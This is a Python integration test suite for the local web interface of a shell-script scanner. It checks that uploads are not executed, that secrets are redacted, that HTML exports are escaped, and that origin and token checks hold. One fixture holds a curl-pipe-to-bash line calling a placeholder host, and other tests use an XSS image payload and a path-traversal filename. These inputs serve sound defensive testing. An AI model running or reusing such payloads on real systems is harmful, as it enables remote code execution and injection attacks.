import hashlib
import http.client
import json
import threading
import unittest
from pathlib import Path
from unittest import mock

from nexa_scriptguard.gui import GuiServer
from nexa_scriptguard.limits import ScanLimits
from nexa_scriptguard.reports import validate_report, validate_sarif


class GuiIntegrationTests(unittest.TestCase):
    def setUp(self):
        self.server = GuiServer()
        self.thread = threading.Thread(target=self.server.serve_forever)
        self.thread.start()
        self.addCleanup(self.close_server)

    def close_server(self):
        self.server.shutdown()
        self.thread.join()
        self.server.server_close()

    def request(self, method, path, body=None, headers=None):
        conn = http.client.HTTPConnection("127.0.0.1", self.server.server_port, timeout=5)
        self.addCleanup(conn.close)
        conn.request(method, path, body=body, headers=headers or {})
        response = conn.getresponse()
        self.result_id = response.getheader("X-Nexa-Result") or getattr(self, "result_id", "")
        return response.status, response.read()

    def upload(self, data, name="example.sh"):
        return self.request("POST", "/analyze", data, {
            "Origin": self.server.origin,
            "X-Nexa-Token": self.server.token,
            "X-Nexa-Filename": name,
            "Content-Type": "application/octet-stream",
        })

    def test_demo_upload_and_exports_do_not_execute_script(self):
        data = Path("demo_example.sh").read_bytes()
        with mock.patch("subprocess.Popen", side_effect=AssertionError("unexpected execution")):
            status, body = self.upload(data)
        self.assertEqual(status, 200)
        report = json.loads(body)
        self.assertEqual(report["sha256"], hashlib.sha256(data).hexdigest())
        self.assertTrue(report["findings"])
        self.assertTrue(validate_report(report))
        for format_name in ("json", "html", "sarif"):
            status, body = self.request("GET", "/export/" + format_name, headers={
                "X-Nexa-Token": self.server.token,
                "X-Nexa-Result": self.result_id,
            })
            self.assertEqual(status, 200)
            if format_name == "json":
                self.assertEqual(json.loads(body), report)
            elif format_name == "sarif":
                validate_sarif(json.loads(body))
            else:
                self.assertIn(b"<!doctype html>", body.lower())

    def test_redacted_untrusted_content_and_incomplete(self):
        data = b'password=synthetic_secret\ncurl https://example.invalid/x | bash # <img src=x onerror=alert(1)>\n\xff\n'
        status, body = self.upload(data)
        self.assertEqual(status, 200)
        self.assertNotIn(b"synthetic_secret", body)
        report = json.loads(body)
        self.assertFalse(report["complete"])
        self.assertEqual(report["analysis_status"], "incomplete")
        self.assertTrue(report["incomplete_reasons"])
        status, html = self.request("GET", "/export/html", headers={
            "X-Nexa-Token": self.server.token, "X-Nexa-Result": self.result_id,
        })
        self.assertEqual(status, 200)
        self.assertNotIn(b"<img src=x onerror=alert(1)>", html)

    def test_incomplete_corpus_preserves_untrusted_text_as_data(self):
        data = Path("tests/corpus/gui_incomplete.sh").read_bytes()
        status, body = self.upload(data)
        self.assertEqual(status, 200)
        report = json.loads(body)
        self.assertFalse(report["complete"])
        self.assertIn("<img", json.dumps(report))

    def test_old_result_cannot_export_another_tabs_report(self):
        self.assertEqual(self.upload(b"echo first\n")[0], 200)
        old_id = self.result_id
        self.assertEqual(self.upload(b"echo second\n")[0], 200)
        self.assertNotEqual(old_id, self.result_id)
        self.assertEqual(self.request("GET", "/export/json", headers={
            "X-Nexa-Token": self.server.token, "X-Nexa-Result": old_id,
        })[0], 409)

    def test_authentication_host_origin_and_filenames(self):
        headers = {"Origin": "http://evil.invalid", "X-Nexa-Token": self.server.token,
                   "X-Nexa-Filename": "a.sh"}
        self.assertEqual(self.request("POST", "/analyze", b"echo a", headers)[0], 403)
        headers["Origin"] = self.server.origin
        headers["X-Nexa-Token"] = "wrong"
        self.assertEqual(self.request("POST", "/analyze", b"echo a", headers)[0], 403)
        self.assertEqual(self.request("GET", "/", headers={"Host": "evil.invalid"})[0], 403)
        self.assertEqual(self.upload(b"echo a", "..%2fother.sh")[0], 400)
        self.assertEqual(self.upload(b"echo a", "other.txt")[0], 400)
        self.assertEqual(self.request("GET", "/export/json")[0], 403)

    def test_limits_and_busy_state(self):
        self.server.limits = ScanLimits(max_input_bytes=5)
        self.assertEqual(self.upload(b"123456")[0], 413)
        self.server.lock.acquire()
        try:
            self.assertEqual(self.upload(b"123")[0], 409)
            self.assertEqual(self.request("GET", "/export/json", headers={
                "X-Nexa-Token": self.server.token,
            })[0], 409)
        finally:
            self.server.lock.release()

    def test_failed_analysis_clears_previous_result(self):
        self.assertEqual(self.upload(b"echo hello\n")[0], 200)
        with mock.patch("nexa_scriptguard.gui.analyze", side_effect=ValueError("test error")):
            status, body = self.upload(b"echo hello\n")
        self.assertEqual(status, 500)
        self.assertIn(b"test error", body)
        self.assertEqual(self.request("GET", "/export/json", headers={
            "X-Nexa-Token": self.server.token,
        })[0], 409)

    def test_assets_restrict_scripts_and_use_text_content(self):
        status, body = self.request("GET", "/app.js")
        self.assertEqual(status, 200)
        self.assertIn(b"textContent", body)
        self.assertNotIn(b"innerHTML", body)

    def test_infinity_shield_is_available_to_the_interface(self):
        status, page = self.request("GET", "/")
        self.assertEqual(status, 200)
        self.assertIn(b'src="/infinity-shield.svg"', page)
        status, shield = self.request("GET", "/infinity-shield.svg")
        self.assertEqual(status, 200)
        self.assertIn(b"<svg", shield)
        self.assertIn(b"Infinity</text>", shield)
        self.assertIn(b"NEXTGENAI</text>", shield)
